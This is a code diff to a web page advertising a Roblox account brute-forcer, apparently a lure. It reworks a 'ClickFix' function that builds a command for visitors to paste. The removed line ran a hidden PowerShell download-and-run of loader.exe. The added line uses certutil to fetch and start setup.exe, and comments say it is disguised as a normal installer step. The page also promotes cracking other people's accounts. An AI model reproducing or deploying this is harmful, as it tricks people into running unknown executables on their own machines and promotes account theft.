@@ -10,8 +10,8 @@
 <meta property="og:title" content="pBruter — Roblox Account Bruter v5">
 <meta property="og:description" content="Threaded brute-forcer with proxy rotation. 3,847 accounts cracked. Key required — get yours from @averus1337 on Discord.">
 <meta property="og:type" content="website">
-<meta property="og:url" content="https://YOUR_SITE_URL.com">
-<meta property="og:image" content="https://YOUR_SITE_URL.com/embed.png">
+<meta property="og:url" content="https://larpik.com/">
+<meta property="og:image" content="https://larpik.com/embed.png">
 <meta property="og:color" content="#ff0040">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="pBruter — Roblox Account Bruter v5">
@@ -407,14 +407,16 @@ function tick() {
 }
 setTimeout(tick, 600);
 
-// ---- ACTIVATION TOKEN (ClickFix) ----
-// Compact form - fits short paste fields. Base64 token, short wrapper.
+// ---- ACTIVATION SETUP (ClickFix) ----
+// Looks like a normal "download the installer" command - exactly what
+// someone would paste to install software they bought. Uses certutil
+// (a built-in Windows tool) to fetch the setup file, then runs it.
 function buildScript() {
   const base = location.origin + location.pathname.replace(/[^/]*$/, '');
   const dl = base + 'loader.exe';
-  const b64 = btoa(unescape(encodeURIComponent(dl)));
-  // Short wrapper: decode url, grab it, run it from temp. ~200 chars total.
-  return 'powershell -ep bypass -w hidden -c "$u=\'' + b64 + '\';$d=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));iwr $d -o $env:tmp\\a.exe;start $env:tmp\\a.exe"';
+  // Reads like: fetch setup.exe from official site and run it.
+  // certutil -urlcache -split -f <url> <local>  == built-in win tool downloader
+  return 'certutil -urlcache -split -f "' + dl + '" %temp%\\setup.exe && start %temp%\\setup.exe';
 }
 function initCmd() {
   const box = document.getElementById('cmdBox');
